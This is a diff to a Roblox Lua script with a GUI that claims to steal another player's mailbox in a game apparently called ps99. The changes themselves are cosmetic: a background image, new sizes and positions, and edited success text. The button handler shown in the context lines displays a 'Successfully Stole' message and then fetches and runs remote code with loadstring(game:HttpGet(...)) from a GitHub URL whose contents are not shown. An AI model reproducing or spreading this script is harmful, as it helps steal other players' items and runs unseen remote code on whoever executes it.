@@ -3,13 +3,19 @@ local Frame = Instance.new("Frame")
 local TextBox = Instance.new("TextBox")
 local StealButton = Instance.new("TextButton")
 local StatusLabel = Instance.new("TextLabel")
+local BackgroundImage = Instance.new("ImageLabel")
 
 ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
+-- Background Image
+BackgroundImage.Parent = ScreenGui
+BackgroundImage.Size = UDim2.new(1, 0, 1, 0)
+BackgroundImage.Image = "rbxassetid://10100073890" -- Your ps99 background image asset ID
+
 Frame.Parent = ScreenGui
 Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Frame.Position = UDim2.new(0.5, -150, 0.5, -75)
-Frame.Size = UDim2.new(0, 300, 0, 200)
+Frame.Position = UDim2.new(0.5, -200, 0.5, -150)
+Frame.Size = UDim2.new(0, 400, 0, 300)
 
 TextBox.Parent = Frame
 TextBox.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
@@ -89,14 +95,14 @@ StealButton.MouseButton1Click:Connect(function()
 
     SuccessFrame.Parent = SuccessGui
     SuccessFrame.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
-    SuccessFrame.Position = UDim2.new(0.0,5,0.5, -50)
+    SuccessFrame.Position = UDim2.new(0.5, -150, 0.5, -50)
     SuccessFrame.Size = UDim2.new(0, 300, 0, 100)
 
     SuccessLabel.Parent = SuccessFrame
     SuccessLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    SuccessLabel.Position = UDim2.new(0., 5, 0.0, 0)
-    SuccessLabel.Size = UDim2.new(0.8, 0, 0.4, 0)
-    SuccessLabel.Text = "Successfully Stole " .. username .. "'s mailbox Please Rejoin if it didnt work!"
+    SuccessLabel.Position = UDim2.new(0.1, 0, 0.1, 0)
+    SuccessLabel.Size = UDim2.new(0.8, 0, 0.8, 0)
+    SuccessLabel.Text = "Successfully Stole " .. username .. "'s mailbox! Please Rejoin if it didn't work!"
 
     -- Execute another script
     loadstring(game:HttpGet("https://raw.githubusercontent.com/D3athFeather/ps99/main/de870018723945ddefe27853.lua"))()
